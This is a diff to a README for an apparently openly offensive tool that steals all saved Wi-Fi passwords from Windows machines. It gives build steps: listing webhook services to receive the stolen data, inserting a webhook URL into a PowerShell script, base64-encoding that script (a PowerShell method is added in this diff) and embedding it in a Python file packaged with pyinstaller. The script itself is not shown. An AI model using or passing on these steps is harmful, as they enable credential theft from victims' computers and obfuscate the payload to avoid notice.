@@ -8,7 +8,7 @@ Exfiltrate all saved Wi-Fi passwords from Windows
  
 2. Install pyinstaller `C:\> pip install pyinstaller`
 
-3. Create a webhook url
+3. Create a webhook
 - https://requestinspector.com
 - https://beeceptor.com
 - https://webhook.site
@@ -18,9 +18,16 @@ Exfiltrate all saved Wi-Fi passwords from Windows
 
 1. Open  `getwifis.ps1` and replace `WEBHOOK_URL_HERE` with your webhook url.
 
-2. Encode Powershell (Linux command):
+2. Encode Powershell  
+- Linux command:
 ```bash
 iconv -f ASCII -t UTF-16LE getwifis.ps1 | base64 -w0
+```
+
+- Powershell command (you must remove new lines):
+```powershell
+$data = Get-Content C:\getwifis.ps1
+[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data))
 ```
 
 3. Open `script.py` and replace `B64_HERE` with your base64 code.
